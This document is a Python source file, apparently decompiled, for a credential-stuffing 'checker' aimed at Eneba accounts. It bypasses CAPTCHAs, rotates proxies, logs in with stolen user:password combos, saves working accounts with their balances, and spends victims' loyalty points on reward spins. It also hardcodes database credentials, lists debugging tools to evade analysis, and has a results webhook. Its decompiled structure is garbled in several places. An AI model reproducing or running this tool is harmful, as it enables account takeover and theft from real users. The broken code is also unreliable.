global twofa  # inserted
global fail  # inserted
global hit  # inserted
global checked  # inserted
try:
    import wmi
    import os
    import mysql.connector
    import socket
    import ctypes
    import sys
    from datetime import datetime
    from colorama import Fore
    from packaging import version
width = os.get_terminal_size().columns
os.system('title ENEBA CHECKER BY @krzychu_06')
uuid = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
print(f"[{datetime.now().strftime('%H:%M:%S')}] [{Fore.GREEN}info{Fore.WHITE}] [+] {uuid}")
print(f"[{datetime.now().strftime('%H:%M:%S')}] [{Fore.GREEN}info{Fore.WHITE}] [+] Copy and paste text for @Krzychu_06")
CURRENT_VERSION = '1.2.1'

def test_mysql_connection():
    try:
        conn = mysql.connector.connect(host='146.59.88.53', port=3306, user='k38518_s33983', password='41d40e1702af', database='db_33983')
        print('[DEBUG] ✔ Połączenie z bazą OK!')
        conn.close()
    except Exception as e:
        print('[DEBUG] ❌ Błąd połączenia z bazą')

def check_license():
    try:
        conn = mysql.connector.connect(host='146.59.88.53', port=3306, user='k38518_s33983', password='41d40e1702af', database='db_33983')
        cursor = conn.cursor()
        cursor.execute('\n            SELECT COUNT(*) FROM licenses\n            WHERE uuid = %s AND active = 1 AND LICENS_EXPIRED > NOW()\n        ', (uuid,))
        result = cursor.fetchone()
        cursor.close()
        conn.close()
        if result[0] == 0:
            ctypes.windll.user32.MessageBoxW(0, 'No active or valid license.\nThe program will be closed.', 'License', 16)
            sys.exit(1)
        return
    except Exception as e:
        error_msg = 'Błąd połączenia z bazą:\n'
        ctypes.windll.user32.MessageBoxW(0, error_msg, 'License', 16)
        sys.exit(1)
check_license()
print(f"[{datetime.now().strftime('%H:%M:%S')}] [{Fore.GREEN}info{Fore.WHITE}] [+] License OK - I am running the program...")

def check_version():
    try:
        conn = mysql.connector.connect(host='146.59.88.53', port=3306, user='k38518_s33983', password='41d40e1702af', database='db_33983')
        cursor = conn.cursor()
        cursor.execute('SELECT min_version FROM app_config ORDER BY id DESC LIMIT 1')
        result = cursor.fetchone()
        cursor.close()
        conn.close()
        if result:
            min_required_version = result[0]
            if version.parse(CURRENT_VERSION) < version.parse(min_required_version):
                ctypes.windll.user32.MessageBoxW(0, f'Your version ({CURRENT_VERSION}) is out of date.\nThe required version is: {min_required_version}\nUpdate the program.', 'Update required', 16)
                sys.exit(1)
            return
    except Exception as e:
        ctypes.windll.user32.MessageBoxW(0, 'Błąd sprawdzania wersji:\n', 'Błąd wersji', 16)
        sys.exit(1)
check_license()
check_version()
print(f"[{datetime.now().strftime('%H:%M:%S')}] [{Fore.GREEN}info{Fore.WHITE}] [+] License & version OK - I am running the program...\n")
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import ctypes
from threading import Lock
import psutil
import json
import random

def detect_debuggers():
    suspicious_processes = ['http toolkit.exe', 'httpdebuggerui.exe', 'wireshark.exe', 'fiddler.exe', 'charles.exe', 'ida.exe', 'ida64.exe', 'ida32.exe', 'ollydbg.exe', 'x64dbg.exe', 'x32dbg.exe', 'x96dbg.exe', 'ghidra.exe', 'dnspy.exe', 'dnspy-netcore.exe', 'processhacker.exe', 'processhacker2.exe', 'processmonitor.exe', 'procmon.exe', 'procmon64.exe', 'tcpview.exe', 'reshacker.exe', 'scylla.exe', 'scylla_x64.exe', 'scylla_x86.exe', 'megadumper.exe', 'ksdumperclient.exe', 'ksdumper.exe', 'cheatengine.exe', 'cheatengine-x86_64.exe', 'burpsuitecommunity.exe', 'burpsuite.exe', 'burpsuiteprofessional.exe', 'burpsuitepro.exe', 'pe-bear.exe', 'hxd.exe', 'radare2.exe', 'cutter.exe', 'frida.exe', 'frida-trace.exe', 'frida-server.exe', 'reclass.net.exe', 'reclass64.exe', 'reclass.exe', 'de4dot.exe', 'api-monitor.exe', 'immunitydebugger.exe', 'windbg.exe', 'vmmap.exe', 'dependencywalker.exe', 'xdbg.exe', 'tcpdump.exe',
    for proc in psutil.process_iter(['name']):
        try:
            pname = proc.info['name'].lower()
            for bad_proc in suspicious_processes:
                if bad_proc.lower() in pname:
                    pass  # postinserted
                else:  # inserted
                    ctypes.windll.user32.MessageBoxW(0, f'Unauthorized tool detected: {pname}\nExiting.', 'Security Warning', 16)
                    sys.exit(1)
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        pass
detect_debuggers()
with open('config.json', 'r', encoding='utf-8') as cfg_file:
    config = json.load(cfg_file)
combo_file = 'combo.txt'
output_file = 'success.txt'
captcha_api_url = config.get('captcha_api_url', 'http://localhost:5000')
target_url = 'https://eneba.com'
sitekey = '0x4AAAAAAAOFaBncc1xr1bbM'
checked = 0
hit = 0
fail = 0
twofa = 0
rules_counts = {'Rules3': 0, 'Rules2': 0, 'Rules1': 0}
lock = Lock()
win_values = [1, 10, 30, 50, 100, 200, 300, 500, 1000, 2000, 5000, 10000]
win_total_counter = {amount: 0 for amount in win_values}
win_lock = Lock()

def load_proxies(file_path='proxies.txt'):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print('❌ Plik z proxy nie został znaleziony.')
        return []
proxies_list = load_proxies()

def get_random_proxy():
    if not proxies_list:
        pass  # postinserted
    return None

def update_console_title(total):
    base_title = f"Checked {checked}/{total} | Hit {hit} | Fail {fail} | 2FA {twofa} | R1 {rules_counts['Rules1']} | R2 {rules_counts['Rules2']} | R3 {rules_counts['Rules3']}"
    win_parts = []
    with win_lock:
        for amount in win_values:
            count_amt = win_total_counter[amount]
            if count_amt > 0:
                pass  # postinserted
            else:  # inserted
                euro = amount / 100
                win_parts.append(f'{euro:.2f}€:{count_amt}')
    wins_str = ' | Wins ' + ' '.join(win_parts) if win_parts else ''
    ctypes.windll.kernel32.SetConsoleTitleW(base_title + wins_str)

def solve_captcha(max_retries=3):
    for attempt in range(max_retries):
        print(f'🔁 Approach to CAPTCHA Solutions: {attempt + 1}/{max_retries}')
        url = f'{captcha_api_url}/turnstile?url={target_url}&sitekey={sitekey}'
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            response = requests.get(url, headers=headers)
            response.raise_for_status()
            data = response.json()
            task_id = data.get('task_id')
            if not task_id:
                print('❌ Missing task_id!')
                continue
            for check in range(30):
                result_url = f'{captcha_api_url}/result?id={task_id}'
                try:
                    res = requests.get(result_url, headers=headers)
                    if res.text.strip() == 'CAPTCHA_NOT_READY':
                        time.sleep(5)
                        continue
                    result = res.json()
                    if 'value' in result:
                        print('✅ CAPTCHA solved!')
                        return result['value']
                print('❌ Timeout while waiting for captcha.')
    else:  # inserted
        print('❌ CAPTCHA was not solved after several attempts.')
    except Exception as e:
        print(f'❌ Error getting task_id: {e}')
    except Exception as e:
        print(f'❌ Error getting captcha result: {e}')
        break

def login_and_check(user, passwd, captcha_solution, max_retries=3):
    url = 'https://my.eneba.com/oauth/token'
    multipart_data = {'grant_type': (None, 'password'), 'client_id': (None, '875b7ca2-6022-11e8-afac-0242ac15000a'), 'username': (None, user), 'password': (None, passwd), 'captcha': (None, captcha_solution), 'keepLogin': (None, 'false'), 'captchaProvider': (None, 'TURNSTILE'), '_locale': (None, 'en'), 'nsid': (None, 'baa5a7cd-46ca-4bc4-8b22-8018becdb906'), 'currency': (None, 'EUR')}
    headers = {'User-Agent': 'EnebaApp v1.9.25 (1178); Android (12); star2gltechn', 'Accept': 'application/json'}
    for attempt in range(1, max_retries + 1):
        proxies = get_random_proxy()
        try:
            response = requests.post(url, files=multipart_data, headers=headers, proxies=proxies, timeout=15)
            if 'auth.magic_link_locked' in response.text:
                time.sleep(2)
            else:  # inserted
                if 'access_token' in response.text:
                    token = response.json()['access_token']
                    print(f'✅ Logged in: {user}')
                    with open('SUCCESS.txt', 'a', encoding='utf-8') as file:
                        file.write(f'{user}:{passwd}\n')
                            return token
    except Exception as e:
        print(f'❌ Error while logging in {user}: {e}')
        return

def check_balance_and_points(token, user, passwd):
    headers = {'Authorization': f'Bearer {token}', 'User-Agent': 'EnebaApp v1.9.25 (1178); Android (12); star2gltechn', 'X-Version': '1.9.25', 'X-App': 'enebaApp', 'X-Os': 'android', 'Accept': '*/*'}
    loyalty_payload = {'operationName': 'getLoyaltyPoints', 'variables': {'context': {'country': 'PL', 'region': 'poland', 'language': 'en'}}, 'query': 'query getLoyaltyPoints($context: Loyalty_ContextInput) {\n            Loyalty_loyaltyPoints(context: $context) {\n                amount\n                __typename\n            }\n        }'}
    try:
        loyalty_res = requests.post('https://mobile.eneba.com/graphql/', json=loyalty_payload, headers=headers)
        points = loyalty_res.json()['data']['Loyalty_loyaltyPoints']['amount']
        print(f'🎁 Loyalty points: {points}')
        punkty = f'{user}:{passwd} | POINTS: {points}'
        with open('POINTS.txt', 'a', encoding='utf-8') as file:
            file.write(punkty + '\n')
                return (None, points)
    except Exception as e:
        return (None, None)

def check_snakzy_home_screen(token, user, passwd, points):
    url = 'https://mobile.snakzy.app/graphql/'
    headers = {'Host': 'mobile.snakzy.app', 'Accept': '*/*', 'Accept-Language': 'en', 'Authorization': f'Bearer {token}', 'User-Agent': 'SnakzyApp v0.0.56 (566); Android (12); star2gltechn', 'Content-Type': 'application/json'}
    payload = {'operationName': 'GetHomeScreen', 'variables': {'context': {'country': 'PL', 'region': 'poland', 'language': 'en'}, 'deviceType': 'SMARTPHONE', 'operatingSystem': 'ANDROID', 'operatingSystemVersion': '12', 'deviceFreeSpace': '124015710208', 'first': 10, 'firstSessions': 10, 'firstGiftBoxes': 10, 'includeWelcomeDailyBonusRewards': False, 'includeRewardGoalUserEdge': False, 'screenWidth': 900}, 'query': 'query GetHomeScreen($context: PlayEarn_ContextInput, $deviceType: PlayEarn_DeviceTypeEnum!, $operatingSystem: PlayEarn_OperatingSystemEnum!, $operatingSystemVersion: String!, $deviceFreeSpace: String!, $first: Int!, $firstSessions: Int!, $firstGiftBoxes: Int!, $includeWelcomeDailyBonusRewards: Boolean!, $includeRewardGoalUserEdge: Boolean!, $screenWidth: Int) {\n  PlayEarn_offerBox(\n    context: $context\n    deviceType: $deviceType\n    operatingSystem: $operatingSystem\n    operatingSystemVersion: $operatingSystemVersion\n    deviceFreeSpace: $deviceFreeSpace\n  ) {\n    ...OfferBoxComponent\n    __typename\n  }\n  PlayEarn_offerSlots(context: $context, first: $first) {\n    edges {\n      node {\n        ...MinimalOfferSlot\n        __typename\n      }\n      __typename\n    }\n    pageInfo {\n      endCursor\n      hasNextPage\n      __typename\n    }\n    __typename\n  }\n  PlayEarn_condition {\n    ...Condition\n    __typename\n  }\n  PlayEarn_gameSessions(context: $context, first: $firstSessions) {\n    edges {\n      node {\n        ...GameSession\n        __typename\n      }\n      __typename\n    }\n    unclaimedCount\n    __typename\n  }\n  PlayEarn_dailyQuest(context: $context) {\n    ...DailyQuest\n    __typename\n  }\n  PlayEarn_giftBoxUserEdges(first: $firstGiftBoxes, context: $context) {\n    edges {\n      node {\n        ...GiftBoxUserEdge\n        __typename\n      }\n      __typename\n    }\n    pageInfo {\n      endCursor\n      hasNextPage\n      __typename\n    }\n    __typename\n  }\n  PlayEarn_activeRewardBooster {\n    ...RewardBooster\n    __typename\n  }\n  PlayEarn_rewardBoosters(first: $first) {\n    edges {\n      node {\n        ...RewardBooster\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  PlayEarn_wallet(context: $context) {\n    ...Wallet\n    __typename\n  }\n  PlayEarn_streakChallenge(context: $context) {\n    ...StreakChallenge\n    __typename\n  }\n  PlayEarn_welcomeBonusRewards(context: $context) @include(if: $includeWelcomeDailyBonusRewards) {\n    ...WelcomeBonusRewards\n    __typename\n  }\n  PlayEarn_playGamesQuestUserEdge {\n    ...PlayGamesQuestEdge\n    __typename\n  }\n  PlayEarn_rewardGoalUserEdge @include(if: $includeRewardGoalUserEdge) {\n    ...RewardGoalUserEdge\n    __typename\n  }\n}\n\nfragment OfferBoxComponent on PlayEarn_OfferBox {\n  id\n  expiresAt\n  locked\n  refreshPriceGems\n  totalMonetaryReward {\n    amount\n    currency\n    __typename\n  }\n  refreshesAt\n  items {\n    edges {\n      node {\n        id\n        offer {\n          id\n          totalMonetaryReward {\n            amount\n            __typename\n          }\n          totalMonetaryRewardLabel\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment MinimalOfferSlot on PlayEarn_OfferSlot {\n  index\n  locked\n  priceGems\n  unlocksAt\n  offer {\n    applicationInfo {\n      screenshotUrls(width: $screenWidth)\n      __typename\n    }\n    completedReward\n    cardStyleBackgroundColors\n    cardStyleBackgroundLocations\n    iconUrl\n    id\n    disrupted\n    userState\n    activePlayerCountLabel\n    installBefore\n    userRating\n    playStorePackageName\n    name\n    provider\n    genres(first: 10) {\n      edges {\n        node {\n          id\n          name\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    description\n    totalReward\n    loyaltyTotalReward\n    lastPlayedAgoLabel\n    allTasks: tasks {\n      totalCount\n      totalIndicatorCount\n      totalCompletedCount\n      __typename\n    }\n    coverUrl\n    campaignName\n    __typename\n  }\n  __typename\n}\n\nfragment GameSession on PlayEarn_GameSession {\n  id\n  coinReward\n  endedAt\n  loyaltyReward\n  durationLive\n  number\n  offerUserEdge {\n    id\n    name\n    iconUrl\n    offerId\n    playStorePackageName\n    provider\n    state\n    campaignName\n    __typename\n  }\n  startedAt\n  state\n  stateReason\n  xpReward\n  durationLabel\n  endedAgoLabel\n  __typename\n}\n\nfragment DailyQuest on PlayEarn_DailyQuest {\n  name\n  playtimeCurrentMinutes\n  playtimeGoalMinutes\n  state\n  streakSeen\n  resetsAt\n  __typename\n}\n\nfragment GiftBoxUserEdge on PlayEarn_GiftBoxUserEdge {\n  id\n  coinReward\n  createdAt\n  expiresAt\n  loyaltyReward\n  state\n  userId\n  xpReward\n  streakFreezeReward\n  unlocksAt\n  giftBox {\n    id\n    type\n    __typename\n  }\n  rewardBooster {\n    id\n    multiplier\n    __typename\n  }\n  __typename\n}\n\nfragment RewardBooster on PlayEarn_RewardBoosterUserEdge {\n  id\n  locked\n  duration\n  activatedAt\n  autoActivation\n  expiresAt\n  finishesAt\n  unlocksAt\n  multiplier\n  name\n  state\n  type\n  __typename\n}\n\nfragment StreakChallenge on PlayEarn_StreakChallenge {\n  id\n  currentUnit\n  createdAt\n  lastUnit\n  milestones {\n    ...StreakChallengeMilestone\n    __typename\n  }\n  coinReward\n  __typename\n}\n\nfragment StreakChallengeMilestone on PlayEarn_StreakChallengeMilestone {\n  unit\n  reached\n  reward\n  __typename\n}\n\nfragment Wallet on PlayEarn_Wallet {\n  id\n  marks(first: 20) {\n    edges {\n      node {\n        id\n        name\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  balance\n  balanceClaimableLabel\n  balanceClaimableMin\n  marketplaceBalanceLabel\n  dailyStreak\n  longestDailyStreak\n  iapCount\n  iapSum\n  experience\n  loyaltyBalance\n  profileWizardComplete\n  dailyStreakCompleted\n  marketplaceBalanceCurrencyCode\n  banned\n  shadowBanned\n  suspicious\n  trusted\n  internal\n  phoneVerified\n  totalSyntheticRevenueAmount\n  __typename\n}\n\nfragment Condition on PlayEarn_Condition {\n  canRefreshOfferBox\n  triggerFeedbackForm\n  highestLootBoxCoinReward\n  userLootBoxRewardSum {\n    ...Money\n    __typename\n  }\n  __typename\n}\n\nfragment Money on PlayEarn_Money {\n  amount\n  currency\n  __typename\n}\n\nfragment PlayGamesQuestEdge on PlayEarn_PlayGamesQuestUserEdge {\n  completedCount\n  expiresAt\n  games {\n    completed\n    offerTaskUserEdge {\n      id\n      name\n      playStorePackageName\n      iconUrl\n      offerId\n      __typename\n    }\n    __typename\n  }\n  reward {\n    id\n    coinReward\n    visible\n    __typename\n  }\n  state\n  totalCount\n  updatesSeen\n  __typename\n}\n\nfragment WelcomeBonusRewards on PlayEarn_WelcomeBonusRewards {\n  visible\n  currentRewardDay\n  days {\n    ...WelcomeBonusDay\n    __typename\n  }\n  __typename\n}\n\nfragment WelcomeBonusDay on PlayEarn_WelcomeBonusDay {\n  day\n  state\n  rewardGiftBox {\n    id\n    coinReward\n    rewardBooster {\n      id\n      multiplier\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment RewardGoalUserEdge on PlayEarn_RewardGoalUserEdge {\n  id\n  state\n  merchantSlug\n  claimTransactionId\n  orderEntryToken\n  orderId\n  product {\n    ...PlayEarnProduct\n    __typename\n  }\n  rewardGoal {\n    ...RewardGoal\n    __typename\n  }\n  rewardGuidance {\n    ...RewardGuidance\n    __typename\n  }\n  __typename\n}\n\nfragment RewardGoal on PlayEarn_RewardGoal {\n  id\n  coins\n  imageUrl\n  monetaryValue {\n    amount\n    currency\n    __typename\n  }\n  name\n  region\n  slug\n  __typename\n}\n\nfragment PlayEarnProduct on PlayEarn_Product {\n  id\n  name\n  slug\n  coinPrice\n  coinPriceOriginal\n  value {\n    moneyValue {\n      ...PlayEarnMoney\n      __typename\n    }\n    __typename\n  }\n  moneyPrice {\n    ...PlayEarnMoney\n    __typename\n  }\n  drm {\n    ...PlayEarnDrm\n    __typename\n  }\n  __typename\n}\n\nfragment PlayEarnDrm on PlayEarn_Drm {\n  name\n  backgroundImagePath\n  textColor\n  __typename\n}\n\nfragment PlayEarnMoney on PlayEarn_Money {\n  amount\n  currency\n  __typename\n}\n\nfragment RewardGuidance on PlayEarn_RewardGuidance {\n  totalTasks\n  completedTasks\n  tasks {\n    ...GuidanceTask\n    __typename\n  }\n  __typename\n}\n\nfragment GuidanceTask on PlayEarn_GuidanceTask {\n  coinReward\n  completed\n  subtitle\n  title\n  type\n  __typename\n}\n'}
    response = requests.post(url, headers=headers, json=payload)
    response.raise_for_status()
    response_json = response.json()
    wallet = response_json['data']['PlayEarn_wallet']
    balance = wallet.get('balance', 0)
    balance_claimable = wallet.get('balanceClaimableLabel', 'N/A')
    marketplace_label = wallet.get('marketplaceBalanceLabel', 'N/A')
    loyalty = wallet.get('loyaltyBalance', 0)
    xp = wallet.get('experience', 0)
    print(f'💰 Balance: {marketplace_label}')
    print(f'💰 Snakzy Coins: {balance}/700')
    hity = f'{user}:{passwd} | POINTS: {points} | BALANCE: {marketplace_label} | nakzy Coins: {balance}/700'
    with open('HIT.txt', 'a', encoding='utf-8') as file:
        file.write(hity + '\n')

def save_win_to_file(user, reward, currency):
    message = f'{user}: {reward:.2f} {currency}'
    with open('WIN.txt', 'a', encoding='utf-8') as file:
        file.write(message + '\n')
        print(f'📝 Win saving: {message}')
    try:
        webhook_url = config.get('webhook_url')
        if not webhook_url:
            print('❌ Missing webhook in config.json!')
        return None
    except Exception as e:
        print(f'❌ Exception when sending webhook: {e}')

def spin_wheel(token, points, user):
    headers = {'Authorization': f'Bearer {token}', 'User-Agent': 'EnebaApp v1.9.25 (1178); Android (12); star2gltechn', 'X-Version': '1.9.25', 'X-App': 'enebaApp', 'X-Os': 'android', 'Accept': '*/*', 'Content-Type': 'application/json', 'Mobile-Device-Id': 'c95a2898084b7f26'}
    context = {'country': 'PL', 'region': 'poland', 'language': 'en'}
    spin_costs = [('Rules3', 349), ('Rules2', 249), ('Rules1', 149)]
    spin_limits = {'Rules3': 0, 'Rules2': 0, 'Rules1': 0}
    if points >= 149:
        any_spin_possible = False
        for rule, cost in spin_costs:
            if points < cost or spin_limits[rule] >= 5:
                continue
            payload_start = {'operationName': 'startSpin', 'variables': {'context': context, 'input': {'groupId': 'Group1', 'ruleId': rule}}, 'query': 'mutation startSpin($context: Loyalty_ContextInput, $input: Loyalty_SpinInput) {\n                    Loyalty_spin(context: $context, input: $input) {\n                        eventNotificationTopic\n                        spinId\n                        success\n                        __typename\n                    }\n                }'}
            try:
                res_start = requests.post('https://mobile.eneba.com/graphql/', json=payload_start, headers=headers)
                res_data = res_start.json()
                if not isinstance(res_data, dict):
                    print(f'❌ Incorrect response from server: {res_data}')
                    continue
                if 'errors' in res_data:
                    if any((error.get('message') == 'Too early for a new spin.' for error in res_data['errors'])):
                        print(f'⏳ Too early for {rule}')
                    else:  # inserted
                        print(f"❌ Another error at {rule}: {res_data['errors']}")
                else:  # inserted
                    spin_info = res_data.get('data', {}).get('Loyalty_spin')
                    if not spin_info or not spin_info.get('success') or (not spin_info.get('spinId')):
                        print(f'❌ Failed to start spin ({rule}): {res_data}')
                        continue
                    any_spin_possible = True
                    spin_id = spin_info['spinId']
                    print(f'🎰 Spin ({rule}) started, ID: {spin_id}')
                    time.sleep(2)
                    payload_result = {'operationName': 'Loyalty_spinResult', 'variables': {'context': context, 'id': spin_id}, 'query': 'query Loyalty_spinResult($id: Loyalty_Uuid!, $context: Loyalty_ContextInput) {\n                        Loyalty_spinResult(id: $id, context: $context) {\n                            amount {\n                                amount\n                                currency\n                                __typename\n                            }\n                            claimable\n                            createdAt\n                            id\n                            rewardId\n                            state\n                            updatedAt\n                            __typename\n                        }\n                    }'}
                    for _ in range(5):
                        res_result = requests.post('https://mobile.eneba.com/graphql/', json=payload_result, headers=headers)
                        result_data = res_result.json()
                        spin_result = result_data.get('data', {}).get('Loyalty_spinResult')
                        if spin_result is not None:
                            break
                    else:  # inserted
                        print(f'❌ Missing spine horns: {result_data}')
                        points -= cost
                        spin_limits[rule] += 1
                        with lock:
                            rules_counts[rule] += 1
                            update_console_title(total=len(combos))
                                break
                        amount_data = spin_result.get('amount')
                        if not amount_data or 'amount' not in amount_data or 'currency' not in amount_data:
                            print(f'❌ Failed to get the prize: {result_data}')
                        points -= cost
                        spin_limits[rule] += 1
                        with lock:
                            rules_counts[rule] += 1
                            update_console_title(total=len(combos))
                                break
        if not any_spin_possible:
            print('⌛ all spin used please wait 24h')
        break
    print('🛑limits have been reached.')
        except Exception as e:
            print(f'❌ Błąd przy spinie ({rule}): {e}')
            return

def process_account(line):
    global checked  # inserted
    global hit  # inserted
    global fail  # inserted
    global twofa  # inserted
    user, passwd = line.split(':', 1)
    print(f'🔍 I\'m trying: {user}')
    captcha_solution = solve_captcha()
    if not captcha_solution:
        print('❌ Account skipped - captcha not solved.')
        with lock:
            fail += 1
            checked += 1
            update_console_title(total=len(combos))
    return None
MAX_WORKERS = config.get('threads', 3)
with open(combo_file, 'r', encoding='utf-8') as f:
    combos = [line.strip() for line in f if ':' in line]
with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    futures = [executor.submit(process_account, line) for line in combos]
except ImportError:
    print('Please wait while I install the required packages.')
    os.system('pip install -r requirements.txt')